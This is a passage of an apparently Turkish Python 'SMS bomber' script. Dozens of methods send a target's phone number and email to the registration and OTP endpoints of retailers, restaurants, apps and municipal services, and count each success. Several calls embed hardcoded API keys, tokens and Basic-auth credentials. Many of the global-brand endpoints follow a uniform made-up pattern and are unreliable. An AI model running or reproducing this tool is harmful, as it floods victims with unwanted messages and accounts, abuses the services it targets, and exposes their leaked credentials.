            r = requests.post(url, json={"PhoneNumber":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Ahmet","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Trendyol(self):
        try:
            url = "https://www.trendyol.com/api/users/v1/register"
            r = requests.post(url, json={"phoneNumber":f"90{self.phone}","email":self.mail,"password":"Password123","firstName":"Ali","lastName":"Demir","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def N11(self):
        try:
            url = "https://www.n11.com/api/User/Register"
            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Mehmet","Surname":"Kaya","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Sahibinden(self):
        try:
            url = "https://www.sahibinden.com/api/User/Register"
            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","FirstName":"Can","LastName":"Yilmaz","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Letgo(self):
        try:
            url = "https://api.letgo.com/api/v1/users"
            r = requests.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","name":"Ayse","surname":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Dolap(self):
        try:
            url = "https://www.dolap.com/api/v2/users"
            r = requests.post(url, json={"phone":f"90{self.phone}","email":self.mail,"password":"Password123","username":f"user_{randint(1000,9999)}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Gittigidiyor(self):
        try:
            url = "https://www.gittigidiyor.com/api/User/Register"
            r = requests.post(url, json={"Phone":f"90{self.phone}","Email":self.mail,"Password":"Password123","Name":"Zeynep","Surname":"Demir","Consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def AmazonTR(self):
        try:
            url = "https://www.amazon.com.tr/ap/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","name":"Ali","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Spotify(self):
        try:
            url = "https://www.spotify.com/api/signup"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","display_name":"User","phone":f"90{self.phone}","consent":True}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Netflix(self):
        try:
            url = "https://www.netflix.com/api/signup"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Discord(self):
        try:
            url = "https://discord.com/api/v9/auth/register"
            r = requests.post(url, json={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","consent":True,"phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Instagram(self):
        try:
            url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
            r = requests.post(url, data={"email":self.mail,"username":f"user_{randint(1000,9999)}","password":"Password123","phone_number":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Facebook(self):
        try:
            url = "https://www.facebook.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}","first_name":"Ahmet","last_name":"Yilmaz"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Twitter(self):
        try:
            r = requests.get("https://api.twitter.com/1.1/account/verify_credentials.json", headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Telegram(self):
        try:
            url = "https://telegram.org/api/register"
            r = requests.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def WhatsApp(self):
        try:
            url = "https://www.whatsapp.com/api/register"
            r = requests.post(url, data={"phone":f"90{self.phone}","email":self.mail}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def TikTok(self):
        try:
            url = "https://www.tiktok.com/api/v1/auth/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Snapchat(self):
        try:
            url = "https://accounts.snapchat.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Pinterest(self):
        try:
            url = "https://www.pinterest.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def LinkedIn(self):
        try:
            url = "https://www.linkedin.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Reddit(self):
        try:
            url = "https://www.reddit.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Tumblr(self):
        try:
            url = "https://www.tumblr.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Twitch(self):
        try:
            url = "https://www.twitch.tv/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Github(self):
        try:
            url = "https://github.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def GitLab(self):
        try:
            url = "https://gitlab.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Bitbucket(self):
        try:
            url = "https://bitbucket.org/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Slack(self):
        try:
            url = "https://slack.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Dropbox(self):
        try:
            url = "https://www.dropbox.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Google(self):
        try:
            url = "https://accounts.google.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Microsoft(self):
        try:
            url = "https://signup.live.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Yahoo(self):
        try:
            url = "https://login.yahoo.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Apple(self):
        try:
            url = "https://appleid.apple.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Samsung(self):
        try:
            url = "https://account.samsung.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Huawei(self):
        try:
            url = "https://id.huawei.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Xiaomi(self):
        try:
            url = "https://account.xiaomi.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Uber(self):
        try:
            url = "https://auth.uber.com/api/v1/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Booking(self):
        try:
            url = "https://www.booking.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Airbnb(self):
        try:
            url = "https://www.airbnb.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Bumble(self):
        try:
            url = "https://bumble.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Tinder(self):
        try:
            url = "https://api.gotinder.com/v1/auth/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Onlyfans(self):
        try:
            url = "https://onlyfans.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Patreon(self):
        try:
            url = "https://www.patreon.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Etsy(self):
        try:
            url = "https://www.etsy.com/api/v1/users/register"
            r = requests.post(url, data={"email":self.mail,"password":"Password123","phone":f"90{self.phone}"}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code in [200,201]: self.adet += 1
        except: pass
    def Kigili(self):
        try:
            url = "https://www.kigili.com/users/registration/"
            r = requests.post(url, data={"first_name":"Memati","last_name":"Bas","email":self.mail,"phone":"0"+self.phone,"password":"nwejkfıower32","confirm":"true","kvkk":"true","next":""}, headers={"User-Agent":"Mozilla/5.0"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login", json={"phone":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sok(self):
        try:
            r = requests.post("https://api.ceptesok.com:443/api/users/sendsms", json={"mobile_number":self.phone,"token_type":"register_token"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Migros(self):
        try:
            r = requests.post("https://rest.migros.com.tr:443/sanalmarket/users/login/otp", json={"phoneNumber":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def A101(self):
        try:
            r = requests.post("https://www.a101.com.tr:443/users/otp-login/", json={"phone":"0"+self.phone,"next":"/a101-kapida"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Sakasu(self):
        try:
            r = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data={"phone":"0"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Zarinplus(self):
        try:
            r = requests.post("https://api.zarinplus.com/user/zarinpal-login", json={"phone_number":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coregap(self):
        try:
            r = requests.post(f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}", timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            r = requests.post(url, headers={"User-Agent":"ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Rentiva(self):
        try:
            r = requests.post("https://rentiva.com:443/api/Account/Login", json={"phone":self.phone,"type":1}, headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X)"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Loncamarket(self):
        try:
            r = requests.post("https://www.loncamarket.com/lid/identity/sendconfirmationcode", json={"Address":self.phone,"ConfirmationType":0}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Tazi(self):
        try:
            r = requests.post("https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", json={"cep_tel":self.phone,"cep_tel_ulkekod":"90"}, headers={"Authorization":"Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD","Content-Type":"application/json;charset=utf-8"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Heyscooter(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            r = requests.post(url, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Ipragaz(self):
        try:
            r = requests.post("https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp",
                json={"birthDate":"2/7/2000","carPlate":"31 ABC 31","name":"Memati Bas","phoneNumber":self.phone},
                headers={"Content-Type":"application/json","User-Agent":"ipragaz-mobile/1.3.9"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Happy(self):
        try:
            r = requests.post("https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone",
                data={"telephone":self.phone},
                headers={"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def KuryemGelsin(self):
        try:
            r = requests.post("https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/", json={"phoneNumber":self.phone,"phone_country_code":"+90"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Taksim(self):
        try:
            r = requests.post("https://service.taksim.digital/services/PassengerRegister/Register",
                json={"countryPhoneCode":"+90","name":"Memati","phoneNo":self.phone,"surname":"Bas"},
                headers={"Content-Type":"application/json; charset=utf-8","Token":"gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def ToptanTeslim(self):
        try:
            r = requests.post("https://toptanteslim.com:443/Services/V2/MobilServis.aspx",
                json={"ISLEM":"KayitOl","TELEFON":self.phone,"EPOSTA":self.mail,"KULLANICI_ADI":"Memati","KULLANICI_SOYADI":"Bas","SEHIR":"İSTANBUL","ILCE":"BAŞAKŞEHİR"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Starbucks(self):
        try:
            r = requests.post("https://auth.sbuxtr.com:443/signUp",
                json={"allowEmail":True,"allowSms":True,"deviceId":"31","email":self.mail,"firstName":"Memati","lastName":"Bas","password":"31ABC..abc31","phoneNumber":self.phone,"preferredName":"Memati"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def BodrumBelediyesi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Clickme(self):
        try:
            r = requests.post("https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code",
                json={"phone":self.phone},
                headers={"Authorization":"apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def NaosstarsShop(self):
        try:
            r = requests.post("https://shop.naosstars.com/users/register/",
                json={"email":self.mail,"first_name":"Memati","last_name":"Bas","password":"nwejkDsOpOJıower32.","date_of_birth":"1975-12-31","phone":"0"+self.phone,"gender":"male","kvkk":"true","contact":"true","confirm":"true"}, timeout=6)
            if r.status_code in [200,201,202]: self.adet += 1
        except: pass
    def Englishhome(self):
        try:
            r = requests.post("https://www.englishhome.com:443/api/member/sendOtp",
                json={"Phone":self.phone,"XID":""},
                headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:135.0)"}, timeout=6)
            if r.json().get("isError") == False: self.adet += 1
        except: pass
    def Suiste(self):
        try:
            r = requests.post("https://suiste.com:443/api/auth/code",
                data={"action":"register","device_id":"2390ED28-075E-465A-96DA-DFE8F84EB330","full_name":"Memati Bas","gsm":self.phone,"is_advertisement":"1","is_contract":"1","password":"31MeMaTi31"},
                headers={"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","User-Agent":"suiste/1.7.11"}, timeout=6)
            if r.json().get("code") == "common.success": self.adet += 1
        except: pass
    def KimGb(self):
        try:
            r = requests.post("https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp", json={"msisdn":"90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Evidea(self):
        try:
            r = requests.post("https://www.evidea.com:443/users/register/",
                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"email_allowed":"false","sms_allowed":"true","password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Ucdortbes(self):
        try:
            r = requests.post("https://api.345dijital.com:443/api/users/register", json={"email":"","name":"Memati","phoneNumber":"+90"+self.phone,"surname":"Bas"}, timeout=6)
            if r.json().get("error") != "E-Posta veya telefon zaten kayıtlı!": self.adet += 1
        except: pass
    def TiklaGelsin(self):
        try:
            query = {"operationName":"GENERATE_OTP","query":"mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\ngenerateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n","variables":{"challenge":"3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68","deviceUniqueId":"720932D5-47BD-46CD-A4B8-086EC49F81AB","phone":"+90"+self.phone}}
            r = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=query, timeout=6)
            if r.json().get("data", {}).get("generateOtp") == True: self.adet += 1
        except: pass
    def Naosstars(self):
        try:
            r = requests.post("https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350", json={"telephone":"+90"+self.phone,"type":"register"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Koton(self):
        try:
            r = requests.post("https://www.koton.com:443/users/register/",
                data={"first_name":"Memati","last_name":"Bas","email":self.mail,"password":"31ABC..abc31","phone":"0"+self.phone,"confirm":"true","sms_allowed":"true","email_allowed":"true","date_of_birth":"1993-07-02","call_allowed":"true"}, timeout=6)
            if r.status_code == 202: self.adet += 1
        except: pass
    def Hayatsu(self):
        try:
            r = requests.post("https://api.hayatsu.com.tr:443/api/SignUp/SendOtp", data={"mobilePhoneNumber":self.phone,"actionType":"register"}, timeout=6)
            if r.json().get("is_success") == True: self.adet += 1
        except: pass
    def Hizliecza(self):
        try:
            r = requests.post("https://prod.hizliecza.net:443/mobil/account/sendOTP", json={"otpOperationType":1,"phoneNumber":"+90"+self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Metro(self):
        try:
            r = requests.post("https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend", json={"methodType":"2","mobilePhoneNumber":self.phone}, timeout=6)
            if r.json().get("status") == "success": self.adet += 1
        except: pass
    def File(self):
        try:
            r = requests.post("https://api.filemarket.com.tr:443/v1/otp/send", json={"mobilePhoneNumber":"90"+self.phone}, timeout=6)
            if r.json().get("responseType") == "SUCCESS": self.adet += 1
        except: pass
    def Akasya(self):
        try:
            r = requests.post("https://akasyaapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!": self.adet += 1
        except: pass
    def Akbati(self):
        try:
            r = requests.post("https://akbatiapi.poilabs.com:443/v1/en/sms", json={"phone":self.phone}, timeout=6)
            if r.json().get("result") == "SMS sended succesfully!": self.adet += 1
        except: pass
    def Komagene(self):
        try:
            r = requests.post("https://gateway.komagene.com.tr:443/auth/auth/smskodugonder", json={"FirmaId":32,"Telefon":self.phone}, timeout=6)
            if r.json().get("Success") == True: self.adet += 1
        except: pass
    def Porty(self):
        try:
            r = requests.post("https://panel.porty.tech:443/api.php?",
                json={"job":"start_login","phone":self.phone},
                headers={"Token":"q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ","Content-Type":"application/json; charset=UTF-8"}, timeout=6)
            if r.json().get("status") == "success": self.adet += 1
        except: pass
    def Tasdelen(self):
        try:
            r = requests.post("https://tasdelen.sufirmam.com:3300/mobile/send-otp", json={"phone":self.phone}, timeout=6)
            if r.json().get("result") == True: self.adet += 1
        except: pass
    def Uysal(self):
        try:
            r = requests.post("https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms", json={"phone_number":self.phone}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Yapp(self):
        try:
            r = requests.post("https://yapp.com.tr:443/api/mobile/v1/register",
                json={"app_version":"1.1.5","code":"tr","device_model":"iPhone8,5","device_name":"Memati","device_type":"I","device_version":"15.8.3","email":self.mail,"firstname":"Memati","is_allow_to_communication":"1","language_id":"2","lastname":"Bas","phone_number":self.phone,"sms_code":""}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def YilmazTicaret(self):
        try:
            formatted = f"0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}"
            r = requests.post("https://app.buyursungelsin.com:443/api/customer/form/checkx",
                data={"fonksiyon":"customer/form/checkx","method":"POST","telephone":formatted,"token":"d7841d399a16d0060d3b8a76bf70542e"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Beefull(self):
        try:
            requests.post("https://app.beefull.io:443/api/inavitas-access-management/signup",
                json={"email":self.mail,"firstName":"Memati","language":"tr","lastName":"Bas","password":"123456","phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull","username":self.mail}, timeout=4)
            r = requests.post("https://app.beefull.io:443/api/inavitas-access-management/sms-login",
                json={"phoneCode":"90","phoneNumber":self.phone,"tenant":"beefull"}, timeout=4)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Dominos(self):
        try:
            r = requests.post("https://frontend.dominos.com.tr:443/api/customer/sendOtpCode", json={"email":self.mail,"isSure":False,"mobilePhone":self.phone}, timeout=6)
            if r.json().get("isSuccess") == True: self.adet += 1
        except: pass
    def Baydoner(self):
        try:
            r = requests.post("https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp",
                json={"AppVersion":"1.6.0","AreaCode":90,"City":"ADANA","CityId":1,"Email":self.mail,"Name":"Memati","PhoneNumber":self.phone,"Surname":"Bas","Password":"31ABC..abc31"}, timeout=6)
            if r.json().get("Control") == 1: self.adet += 1
        except: pass
    def Pidem(self):
        try:
            r = requests.post("https://restashop.azurewebsites.net:443/graphql/",
                json={"query":"\nmutation ($phone: String) {\nsendOtpSms(phone: $phone) {\nresultStatus\nmessage\n}\n}\n","variables":{"phone":self.phone}}, timeout=6)
            if r.json().get("data", {}).get("sendOtpSms", {}).get("resultStatus") == "SUCCESS": self.adet += 1
        except: pass
    def Frink(self):
        try:
            r = requests.post("https://api.frink.com.tr:443/api/auth/postSendOTP", json={"areaCode":"90","etkContract":True,"language":"TR","phoneNumber":"90"+self.phone}, timeout=6)
            if r.json().get("processStatus") == "SUCCESS": self.adet += 1
        except: pass
    def Bodrum(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def KofteciYusuf(self):
        try:
            r = requests.post("https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder", json={"FirmaId":82,"Telefon":self.phone}, timeout=6)
            if r.json().get("Success") == True: self.adet += 1
        except: pass
    def Little(self):
        try:
            r = requests.post("https://api.littlecaesars.com.tr:443/api/web/Member/Register",
                json={"CampaignInform":True,"Email":self.mail,"InfoRegister":True,"IsLoyaltyApproved":True,"NameSurname":"Memati Bas","Password":"31ABC..abc31","Phone":self.phone,"SmsInform":True}, timeout=6)
            if r.status_code == 200 and r.json().get("status") == True: self.adet += 1
        except: pass
    def Orwi(self):
        try:
            r = requests.post("https://gandalf.orwi.app:443/api/user/requestOtp",
                json={"gsm":"+90"+self.phone,"source":"orwi"},
                headers={"Apikey":"YWxpLTEyMzQ1MTEyNDU2NTQzMg","Content-Type":"application/json"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Coffy(self):
        try:
            r = requests.post("https://user-api-gw.coffy.com.tr:443/user/signup",
                json={"countryCode":"90","gsm":self.phone,"isKVKKAgreementApproved":True,"isUserAgreementApproved":True,"name":"Memati Bas"}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Hamidiye(self):
        try:
            r = requests.post("https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp", json={"isGuest":False,"phone":self.phone}, timeout=6)
            if r.json().get("result") == True: self.adet += 1
        except: pass
    def Money(self):
        try:
            formatted = f"{self.phone[:3]} {self.phone[3:10]}"
            r = requests.post("https://www.money.com.tr:443/Account/ValidateAndSendOTP", data={"phone":formatted,"GRecaptchaResponse":""}, timeout=6)
            if r.json().get("resultType") == 0: self.adet += 1
        except: pass
    def Alixavien(self):
        try:
            r = requests.post("https://www.alixavien.com.tr:443/api/member/sendOtp", json={"Phone":self.phone,"XID":""}, timeout=6)
            if r.json().get("isError") == False: self.adet += 1
        except: pass
    def Jimmykey(self):
        try:
            r = requests.post(f"https://www.jimmykey.com:443/tr/p/User/SendConfirmationSms?gsm={self.phone}&gRecaptchaResponse=undefined", timeout=6)
            if r.json().get("Sonuc") == True: self.adet += 1
        except: pass
    def Ido(self):
        try:
            r = requests.post("https://api.ido.com.tr:443/idows/v2/register",
                json={"birthDate":True,"captcha":"","checkPwd":"313131","code":"","day":24,"email":self.mail,"emailNewsletter":False,"firstName":"MEMATI","gender":"MALE","lastName":"BAS","mobileNumber":"0"+self.phone,"month":9,"pwd":"313131","smsNewsletter":True,"tckn":self.tc,"termsOfUse":True,"year":1977}, timeout=6)
            if r.status_code == 200: self.adet += 1
        except: pass
    def Fatih(self):
        try:
            r = requests.post("https://ebelediye.fatih.bel.tr:443/Sicil/KisiUyelikKaydet",
